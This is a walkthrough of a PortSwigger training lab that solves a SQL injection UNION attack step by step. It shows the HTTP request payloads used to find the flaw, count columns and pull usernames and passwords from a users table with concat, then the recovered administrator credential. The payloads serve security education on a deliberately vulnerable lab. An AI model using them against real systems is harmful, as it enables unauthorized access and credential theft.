# [Lab: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

## Lab

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `p`assword`.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## tools

same as [lab 5](./5.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables.md)

## manual

1. Detect SQLi:

    - `GET /filter?category=' HTTP/1.1`

    ```http
    HTTP/1.1 500 Internal Server Error
    ```

2. Determining the number of columns using `ORDER BY`:
    - positions: `GET /filter?category='+ORDER+BY+ยง1ยง-- HTTP/1.1`
    - payloads: 1 -> 10
    - result: 2 columns

3. Exploit:

    ```http
    GET /filter?category='UNION+SELECT+*+FROM+users-- HTTP/1.1
    ```

    - result: `HTTP/1.1 500 Internal Server Error`

4. Check data type:

    ```http
    GET /filter?category=%27UNION+SELECT+'a',NULL+-- HTTP/1.1
    ```

    - => 500

    ```http
    GET /filter?category=%27UNION+SELECT+NULL,'a'+-- HTTP/1.1
    ```

    - => 200
    - => only second column containing text

5. Exploit again using concat function

    ```http
    GET /filter?category='UNION+SELECT+NULL,concat(username,',',password)+FROM+users-- HTTP/1.1
    ```

    - result: `administrator,4fe7szltk7gyvmthhhqw`
6. Login to admin account => Lab Solved
